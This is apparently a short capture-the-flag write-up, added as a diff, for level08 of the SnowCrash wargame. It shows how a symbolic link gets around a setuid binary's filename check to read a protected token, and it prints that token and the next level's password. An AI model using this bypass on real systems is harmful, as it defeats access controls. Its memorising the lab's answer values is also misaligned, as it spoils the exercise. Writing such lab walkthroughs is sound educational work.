@@ -1,0 +1,34 @@
+when we login as level08 user we are given 2 files :
+
+level08@SnowCrash:~$ ls -l
+total 16
+-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
+-rw-------  1 flag08 flag08    26 Mar  5  2016 token
+
+We can not tead the file token and i suppose the flag is hidden in this file and we have to find a way to read it.
+
+when we execute the binary file level08 we get : 
+
+level08@SnowCrash:~$ ./level08 
+./level08 [file to read]
+
+If we provide the token file to this binary it doens'nt want to read it, it seems it verify if the file name is token, if so then do not read it :
+
+level08@SnowCrash:~$ ./level08 token
+You may not access 'token'
+level08@SnowCrash:~$ ./level08 "token asdjha as j"
+You may not access 'token asdjha as j'
+
+All we need to do is change the file name to something that do not contain the word token and to do this we can create a symbolik link :
+
+level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/maflag
+
+
+And now we can execute the program again with the new name :
+
+level08@SnowCrash:~$ ./level08 /tmp/maflag
+quif5eloekouj29ke0vouxean
+
+We have to log into the flag08 account to get the password for the next lavel
+
+So the Password to connect to the account level09 is : 25749xKZ8L7DkSCwJkT9dyv6f
